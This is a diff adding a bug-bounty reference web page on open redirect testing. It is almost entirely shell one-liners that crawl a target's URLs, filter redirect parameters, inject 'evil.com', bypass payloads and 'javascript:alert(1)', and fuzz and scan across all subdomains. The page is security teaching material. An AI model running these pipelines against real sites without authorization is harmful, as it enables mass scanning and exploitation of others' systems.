@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Open Redirect - Bug Bounty Hub</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="index.html" class="nav-logo">
+                <img src="logo/logo.png" alt="BugBounty Hub">
+            </a>
+            <button class="nav-toggle" id="navToggle">
+                <i class="fas fa-bars"></i>
+            </button>
+            <ul class="nav-menu" id="navMenu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link active">Vulnerabilities <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="manual-open-redirect.html"><i class="fas fa-external-link-alt"></i> Manual Open Redirect</a></li>
+                        <li><a href="open-redirect.html"><i class="fas fa-robot"></i> Automated Open Redirect</a></li>
+                        <li><a href="xss.html"><i class="fas fa-bug"></i> XSS</a></li>
+                        <li><a href="blind-xss.html"><i class="fas fa-eye-slash"></i> Blind XSS</a></li>
+                        <li><a href="sqli.html"><i class="fas fa-database"></i> SQL Injection</a></li>
+                        <li><a href="idor.html"><i class="fas fa-id-card"></i> IDOR</a></li>
+                        <li><a href="lfi.html"><i class="fas fa-folder-open"></i> LFI</a></li>
+                        <li><a href="cmdi.html"><i class="fas fa-terminal"></i> Command Injection</a></li>
+                        <li><a href="subdomain-takeover.html"><i class="fas fa-globe"></i> Subdomain Takeover</a></li>
+                        <li><a href="cors.html"><i class="fas fa-exchange-alt"></i> CORS</a></li>
+                        <li><a href="csp-guide.html"><i class="fas fa-shield-alt"></i> CSP Guide</a></li>
+                        <li><a href="xxe.html"><i class="fas fa-file-code"></i> XXE</a></li>
+                        <li><a href="ssti.html"><i class="fas fa-file-alt"></i> SSTI</a></li>
+                        <li><a href="crlf.html"><i class="fas fa-code"></i> CRLF Injection</a></li>
+                        <li><a href="ssrf-payloads.html"><i class="fas fa-server"></i> SSRF Payloads</a></li>
+                        <li><a href="race-conditions.html"><i class="fas fa-stopwatch"></i> Race Conditions</a></li>
+                        <li><a href="poisoning.html"><i class="fas fa-bolt"></i> Cache Poisoning</a></li>
+                        <li><a href="information-disclosure.html"><i class="fas fa-eye"></i> Info Disclosure</a></li>
+                        <li><a href="host-header-injection.html"><i class="fas fa-globe-americas"></i> Host Header</a></li>
+                        <li><a href="header-injection.html"><i class="fas fa-heading"></i> Header Injection</a></li>
+                        <li><a href="html-injection.html"><i class="fas fa-code"></i> HTML Injection</a></li>
+                        <li><a href="directory-traversal.html"><i class="fas fa-folder"></i> Directory Traversal</a></li>
+                        <li><a href="wordpress.html"><i class="fab fa-wordpress"></i> WordPress</a></li>
+                        <li><a href="spring-boot.html"><i class="fas fa-leaf"></i> Spring Boot</a></li>
+                    </ul>
+                </li>
+                <li class="dropdown">
+                    <a href="#" class="nav-link">Tools <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="useful-tools.html"><i class="fas fa-toolbox"></i> Recon Tools</a></li>
+                        <li><a href="nuclei.html"><i class="fas fa-rocket"></i> Nuclei</a></li>
+                    </ul>
+                </li>
+                <li><a href="about.html" class="nav-link">About</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- Page Header -->
+    <header class="page-header">
+        <div class="breadcrumb">
+            <a href="index.html">Home</a>
+            <i class="fas fa-chevron-right"></i>
+            <span>Open Redirect</span>
+        </div>
+        <h1><i class="fas fa-external-link-alt"></i> Open Redirect Testing</h1>
+        <p>End-to-end automation for discovering, validating, fuzzing, and escalating Open Redirect vulnerabilities.</p>
+    </header>
+
+    <!-- Content Section -->
+    <section class="content-section">
+        <div class="container">
+            <div class="content-card">
+                <h2><i class="fas fa-broom"></i> Clean Recon Pipeline - Remove Noisy Parameters</h2>
+                
+                <div class="step-card">
+                    <h3><span class="step-number">1</span>Remove Common Tracking & Analytics Noise</h3>
+                    <p>Create noise parameter list and filter them out:</p>
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <pre>cat > noise_params.txt << 'EOF'
+utm_
+fbclid
+gclid
+msclkid
+ref
+referer
+source
+campaign
+EOF
+grep -vi -f noise_params.txt xssab_clean.txt > step1_no_noise.txt</pre>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <h3><span class="step-number">2</span>Normalize Parameter Values</h3>
+                    <p>Keep only parameter names to spot vulnerable params easily:</p>
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <pre>sed 's/=[^&]*/=FUZZ/g' step1_no_noise.txt | sort -u > step2_normalized.txt</pre>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <h3><span class="step-number">3</span>Keep Only Redirect-Style Parameters</h3>
+                    <p>Create redirect parameter list and filter:</p>
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <pre>cat > redirect_params.txt << 'EOF'
+redirect
+redir
+url
+uri
+next
+dest
+destination
+continue
+return
+returnto
+return_url
+callback
+goto
+out
+forward
+view
+to
+target
+EOF
+grep -Ei "$(paste -sd '|' redirect_params.txt)" step2_normalized.txt > step3_redirect_candidates.txt</pre>
+                    </div>
+                </div>
+
+                <div class="step-card">
+                    <h3><span class="step-number">4</span>Remove Non-Attack Endpoints</h3>
+                    <div class="code-block">
+                        <button class="copy-btn">Copy</button>
+                        <pre>grep -vE '/swf/|/track/|thumbnail|boomerang|rum' step3_redirect_candidates.txt > final_redirects.txt</pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-rocket"></i> Open Redirect Automation</h2>
+                
+                <h3>Requirements - Core Tools</h3>
+                <ul>
+                    <li><code>gau</code> - GetAllUrls</li>
+                    <li><code>katana</code> - Web crawler</li>
+                    <li><code>urlfinder</code> - URL discovery</li>
+                    <li><code>hakrawler</code> - Go web crawler</li>
+                    <li><code>uro</code> - URL optimizer</li>
+                    <li><code>gf</code> - grep on steroids</li>
+                    <li><code>qsreplace</code> - Query string replacer</li>
+                    <li><code>httpx-toolkit</code> - Fast HTTP prober</li>
+                    <li><code>subfinder</code> - Subdomain discovery</li>
+                    <li><code>ffuf</code> - Fast web fuzzer</li>
+                    <li><code>nuclei</code> - Vulnerability scanner</li>
+                </ul>
+
+                <h3>URL Collection (Single Domain)</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>echo target.com | gau > urls1.txt
+echo target.com | katana -d 2 > urls2.txt
+echo target.com | urlfinder -d target.com > urls3.txt
+echo target.com | hakrawler > urls4.txt</pre>
+                </div>
+
+                <h3>Merge, Normalize & Deduplicate URLs</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat urls1.txt urls2.txt urls3.txt urls4.txt | uro | sort -u > final.txt</pre>
+                </div>
+
+                <h3>Open Redirect Parameter Discovery</h3>
+                <h4>GF Pattern (Recommended)</h4>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat final.txt | gf redirect | uro | sort -u > redirect_params.txt</pre>
+                </div>
+
+                <h3>Basic Open Redirect Verification</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"</pre>
+                </div>
+
+                <h3>One-Liner: Subdomain to Redirect Scan</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"</pre>
+                </div>
+
+                <h3>Bypass Payload Fuzzing with Loxs</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat redirect_params.txt | while read url; do
+  cat loxs/payloads/or.txt | while read payload; do
+    echo "$url" | qsreplace "$payload"
+  done
+done | httpx-toolkit -silent -fr -mr "google.com"</pre>
+                </div>
+
+                <h3>FFUF Parameter + Payload Fuzzing</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD \
+-u "https://site.com/redirect.php?PARAM=PAYLOAD" \
+-mc 301,302,303,307,308 \
+-mr "Location: http://google.com" \
+-x http://127.0.0.1:8080 -t 10</pre>
+                </div>
+
+                <h3>Nuclei Open Redirect Scan</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>nuclei -l subdomains.txt -t openRedirect.yaml -c 30</pre>
+                </div>
+
+                <h3>Open Redirect to XSS Escalation</h3>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>cat redirect_params.txt | qsreplace "javascript:alert(1)" | httpx-toolkit -silent -fr</pre>
+                </div>
+            </div>
+
+            <div class="content-card">
+                <h2><i class="fas fa-bolt"></i> Ultimate One-Command Pipeline</h2>
+                <div class="code-block">
+                    <button class="copy-btn">Copy</button>
+                    <pre>subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do
+  cat loxs/payloads/or.txt | while read payload; do
+    echo "$url" | qsreplace "$payload"
+  done
+done | httpx-toolkit -silent -fr -mr "google.com"</pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2026 Bug Bounty Hub. Open source security reference.</p>
+            <p>Made with <i class="fas fa-heart"></i> for the security community</p>
+        </div>
+    </footer>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">Copied to clipboard!</div>
+
+    <script src="script.js"></script>
+</body>
+</html>
